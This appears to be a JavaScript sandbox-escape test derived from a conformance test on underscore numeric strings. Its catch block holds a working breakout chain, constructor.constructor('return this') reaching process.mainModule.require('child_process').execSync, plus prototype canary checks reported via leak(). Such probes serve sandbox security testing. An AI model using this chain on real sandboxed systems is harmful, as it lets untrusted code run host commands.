try {
    assert.sameValue(Number('1_0'), NaN, '1_0');
    assert.sameValue(Number('1_1'), NaN, '1_1');
    assert.sameValue(Number('1_2'), NaN, '1_2');
    assert.sameValue(Number('1_3'), NaN, '1_3');
    assert.sameValue(Number('1_4'), NaN, '1_4');
    assert.sameValue(Number('1_5'), NaN, '1_5');
    assert.sameValue(Number('1_6'), NaN, '1_6');
    assert.sameValue(Number('1_7'), NaN, '1_7');
    assert.sameValue(Number('1_8'), NaN, '1_8');
    assert.sameValue(Number('1_9'), NaN, '1_9');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}